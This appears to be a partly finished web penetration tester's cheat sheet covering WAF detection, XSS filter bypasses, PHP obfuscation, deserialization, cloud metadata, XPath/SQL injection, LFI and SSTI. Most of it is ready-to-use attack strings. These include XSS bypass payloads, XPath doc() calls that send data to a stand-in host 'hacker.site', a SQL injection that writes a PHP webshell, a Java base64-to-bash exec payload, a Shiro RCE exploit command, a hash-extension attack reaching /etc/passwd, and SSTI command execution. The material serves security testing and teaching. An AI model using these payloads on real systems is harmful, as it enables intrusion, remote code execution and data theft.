# Tricks - Web Penetration Tester

- [x] In Construction... (60%)
## WAF

### Manual Detection:

-> Cookies

-> Response Codes

-> Rules

### Response - Status code WAF'S

-> mod_security -> 406 Not Acceptable

-> AQTRONIX WebKnight -> 999 No hacking

### Tool

wafw00f 

https://github.com/EnableSecurity/wafw00f

nmap --script=http-waf-fingerprint

https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html

imperva-detect

https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh

#### Others:

https://github.com/0xInfection/Awesome-WAF

## Host Obfuscation

#### Types

-> DWORD
  
-> OCTAL 
  
-> HEX
  
-> HYBRID

### Tool

https://www.silisoftware.com/tools/ipconverter.php

## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)

### Protection XSS

-> XSS Auditor and XSS Filter

https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

https://www.chromium.org/developers/design-documents/xss-auditor/

https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge

https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection

-> Wordlists for XSS Bypass

https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt

https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt

### XSS Keylogger

https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/

https://github.com/hadynz/xss-keylogger

### XSS Mutation

http://www.businessinfo.co.uk/labs/mxss/

### XSS Poliglote

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

### Regex blacklist filtering

(on\w+\s*=)

<svc/onload=alert(1)>

<svg//////onload=alert(1)>

<svg id=x;onload=alert(1)>
  
<svg id=\`x\`onload=alert(1)>
  
(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
  
<svg onload%09=alert(1)>
  
<svg %09onload=alert(1)>
  
<svg %09onload%20=alert(1)>
  
<svg onload%09%20%28%2C%3B=alert(1)>
  
<svg onload%0B=alert(1)>

### Keyword based in filter
 
#### blocked - alert - bypass
  
-> <script>\u0061lert(1)</script>
  
-> <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
  
-> <script>eval("\u0061lert(1)")</script>
  
-> <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
  
#### Removing HTML Tags
  
<scr<iframe>ipt>alert(1)</script>
  
### Scaping Quote
  
### Methods
  
-> String.fromCharCode()
  
-> unescape

Ex:
 
-> decode URI + unescape method
  
decodeURI(/alert(%22xss%22)/.source)
  
decodeURIComponent(/alert(%22xss%22)/.source)
  
Add execution sink for execution:
  
-> eval
  
### Escaping Parentheses
  
\<img src=x onerror="\u0061lert(1)"/>
  
\<img src=x onerror="eval('\141lert(1)')"/>

\<img src=x onerror="eval('\x61lert(1)')"/>
  
### Others Examples
  
#### HTML Tag
  
<div>
  
here
  
</div>

-> <svg/onload=alert(1)

#### HTML Tag Attributes

<input value="here"/></input>
 
-> adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--
  
#### Script Tag
  
<script>
  
var name="here";
  
</div>
  
</script>
  
-> ;alert(1);//

#### Event Attributes

\<button onclick="reserve(here);">
  
Okay!
  
</button>

-> alert(1)

Dom Based
  
\<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
  
-> javascript:alert(1)

## JavaScript Encoding and Compressor:

-> jjencode

https://utf-8.jp/public/jjencode.html

-> aaencode

https://utf-8.jp/public/aaencode.html

-> jsfuck

https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

-> Minifying

https://developers.google.com/closure/compiler/

-> Packer 

http://dean.edwards.name/packer/

## PHP Obfuscation Techniques:

-> Arithmetic Operators

$§ = 'b';

$§++;

//c

$§ = 'z'

$§++;

//aa

$§ = 'A';

$§++;

//B

$§ = 'a1';

$§++;

//a2

### Bitwise Operators

https://www.php.net/manual/en/language.operators.bitwise.php

Ex:

$a & $b

$a | $b	

$a ^ $b

~ $a

$a << $b

$a >> $b

### Mix - Hex + Octal

echo "t\x72\x69\143\153s"

x72 hex = r

x69 hex = i

143 octal = c

153 octal = k

### Variable Parsing

$a = "ri";

$b ="ck";

echo "T$a[0]$a[1]$b[0]$b[1]s";

### Variable Variables

$a = "T";

$$a = "ri";

$$$a = "cks";

echo $a.$T.$ri;

//Tricks

### PHP Non-Alphanumeric 

$\_="{"; #XOR char

echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET

//GET

https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/

### Tools

-> phponalpha

-> phponalpha2

https://hackvertor.co.uk/public

### PHP Obfuscation - base64+gzdeflate

obufscation.php

## Type Juggling

https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf

### PHP - others tricks

[ eval () execute a chain whose variable $ HTTP_USER_AGENT is so just
change your header in PHP code ]

https://www.exploit-db.com/papers/13694

## Insecure Deserialization 

-> Binary

-> human readable

### PHP Deserialization

#### PHP - Method Serialization:

-> serialize()

-> unserialize()

#### Magic Methods:

-> __construct()

-> __destruct()

-> __wakUp()

#### Class Properties

Public \<s>
 
Ex:

O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}
  
Protected \0 * \0

Ex:

O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}

Private \0 \<s> \0

Ex:
  
O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}

example/class.php
  
#### Trick Bypass

a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}
  
### .NET Deserialization

#### Methods Serialization:

-> Binary Formatter

-> DataContractSerializer

-> NetDataContractSerializer

-> XML Serialization
  
#### Most common places to find serialized data

-> VIEWSTATE
    
-> .NET remoting services
  
#### Tool

https://github.com/pwntester/ysoserial.net

### Java Deserialization

#### Identify

-> import java.io.serializable

-> binary with ac ed 00 05

-> base64 starts with rO0AB in web applications
  
#### java.lang.Runtime.exec()
  
bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}

https://www.bugku.net/runtime-exec-payloads/

### Tools

https://github.com/frohoff/ysoserial

https://github.com/NickstaDB/SerializationDumper

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java

#### Bad Sign

-> ClassNot FoundException

#### Good Sign

-> java.io.IOException

## Cloud

http://169.254.169.254/latest/meta-data

http://169.254.169.254/latest/api/token

### Serverless Injection

echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read
  
### Tools

https://github.com/clarketm/s3recon
  
## XPATH
  
error()

* and doc('http://hacker.site/')
  
* and doc('http://hacker.site/', name(/*) ))
  
%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
  
### Tools
  
https://xcat.readthedocs.io/en/latest/
  
### Wordlists for SQLI e XPath - Authentication Bypass

https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt
  
## Padding Oracle Attack
  
### Identify

-> rememberMe: (Cookie)

### Exploiting 

java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class

https://github.com/frohoff/ysoserial

python shiro_exp.py site.com/home.jsp cookie payload.class

https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
  
## Hash Length Extension Attack

https://github.com/iagox86/hash_extender

https://site.com/index.php?file=oktest&hash=hash

./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out

burp intruder -> payloads.out in file parameter.  
  
## Insecure - Machine Key for RCE 

https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md
  
https://github.com/pwntester/ysoserial.net
  
https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper

## Local File Inclusion - LFI

### LFI - files for fuzzing

### Wordlist LFI - Linux

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

### Wordlist LFI - Windows

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

### Payloads for bypass:

-> bypass_lfi.txt
  
### Wordlist for parameter fuzzing
  
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
  
### Wordlist for subdomain fuzzing
  
https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

### Wordlist for SQL Injection - Bypass

https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt

### Doc for SQL Injection - Bypass

https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
 
### Webshell via SQLI
  
' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile"/var/www/html/pdp.php"-- -
  
## NOSQL Injection
  
https://book.hacktricks.xyz/pentesting-web/nosql-injection
  
## Graphql Introspection

https://ivangoncharov.github.io/graphql-voyager/
  
### SSTI

#### Identify

jinja2 or twig
{{3*3}}

smarty or mako
{3*3}

ERB(Ruby)
<%= 7*7 %>

others
${3*3}
${{3*3}}
#{3*3}
3*3

#### Doc for SSTI	

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

#### Java Expression Language

{{T(java.lang.Runtime).getRuntime().exec('id')}}

''.class.forName('java.lang.Runtime').getRuntime().exec('id')
